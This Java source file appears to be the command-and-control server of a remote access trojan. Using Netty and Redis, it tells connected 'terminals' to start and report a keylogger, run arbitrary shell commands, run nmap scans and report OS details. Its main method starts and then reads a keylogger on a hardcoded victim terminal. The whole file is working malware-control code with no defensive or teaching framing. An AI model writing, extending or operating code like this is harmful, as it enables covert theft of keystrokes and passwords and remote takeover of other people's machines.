package service;


import java.net.UnknownHostException;

import Config.Config;
import com.google.gson.Gson;
import io.netty.channel.Channel;
import io.netty.channel.ChannelId;
import io.netty.channel.group.ChannelGroup;
import javabean.SocketInfo;
import netty.NettyServerBootstrap;
import redis.RedisUtil;

public class ControlService implements ControlServiceImp {
    private NettyServerBootstrap bootstrap;
    private RedisUtil redisUtil;
    private SocketInfo socketInfo;
    private Gson gson;


    public ControlService() throws InterruptedException {
        socketInfo = new SocketInfo();
        gson = new Gson();
        init();
    }


    @Override
    public void init() throws InterruptedException {
        bootstrap = new NettyServerBootstrap(Config.NettyPort);
        redisUtil = new RedisUtil();
    }

    @Override
    public void sendMesgToTerminal(Channel channel, String msg) {
        channel.writeAndFlush(msg);
    }

    @Override
    public Channel getChannel(ChannelId id, ChannelGroup group) {
        return group.find(id);
    }

    @Override
    public void sendMesg(String terminalId, String msg) {

        Channel channel = getChannel(bootstrap.getMesgHandler().getSingleId(), bootstrap.getChannelGroup());
        sendMesgToTerminal(channel, msg);
    }

    @Override
    public ChannelId findChannelIdFromTerminalId(long terminalId) {
        return null;
    }

    @Override
    public boolean runNmap(String terminalID) {
        socketInfo.setResultMsg("");
        socketInfo.setResultCode(Config.Request_Code_Nmap);

        sendMesg(terminalID, gson.toJson(socketInfo));
        return true;
    }

    @Override
    public String runGetos(String terminalID) {
        socketInfo.setResultMsg("");
        socketInfo.setResultCode(Config.Request_Code_GetRunGetOs);
        sendMesg(terminalID, gson.toJson(socketInfo));
        return null;
    }

    @Override
    public String getGetos(String terminalID) {
        socketInfo.setResultMsg("");
        socketInfo.setResultCode(Config.Request_Code_RunRunGetOs);
        sendMesg(terminalID, gson.toJson(socketInfo));

        return redisUtil.getTerminalOsinfo(terminalID);
    }

    @Override
    public String startKeyLogger(String terminalID) {

        socketInfo.setResultMsg("");
        socketInfo.setResultCode(Config.Request_Code_KeyLogger_Start);
        sendMesg(terminalID, gson.toJson(socketInfo));

        redisUtil.setTerminalKeyLoggerStatus(terminalID, "-1");
        redisUtil.setTerminalKeyLoggerInfo(terminalID, "-1");
        try {
            Thread.sleep(3 * 1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        return redisUtil.getTerminalKeyLoggerStatus(terminalID);
    }

    @Override
    public String overKeyLogger(String terminalID) {
        socketInfo.setResultMsg("");
        socketInfo.setResultCode(Config.Request_Code_KeyLogger_Show);
        sendMesg(terminalID, gson.toJson(socketInfo));
        try {
            Thread.sleep(2 * 1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        return redisUtil.getTerminalKeyLoggerInfo(terminalID);
    }

    @Override
    public String execCmdCommand(String terminalID, String msg) {
        socketInfo.setResultMsg(msg);
        socketInfo.setResultCode(Config.Request_Code_RunCmd);
        sendMesg(terminalID, gson.toJson(socketInfo));
        try {
            Thread.sleep(1 * 1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        return redisUtil.getTerminalCmdInfo(terminalID);
    }

    @Override
    public String getNmapInfos(String terminalID) {
        socketInfo.setResultMsg("");
        socketInfo.setResultCode(Config.Request_Code_GetNmapInfo);
        sendMesg(terminalID, gson.toJson(socketInfo));
        return null;
    }


    public static void main(String[] args) throws InterruptedException, UnknownHostException {
        ControlService controlService = new ControlService();
        Thread.sleep(1 * 1000);
        controlService.startKeyLogger("38086cf5");
        Thread.sleep(10 * 1000);
        controlService.overKeyLogger("38086cf5");

    }

}
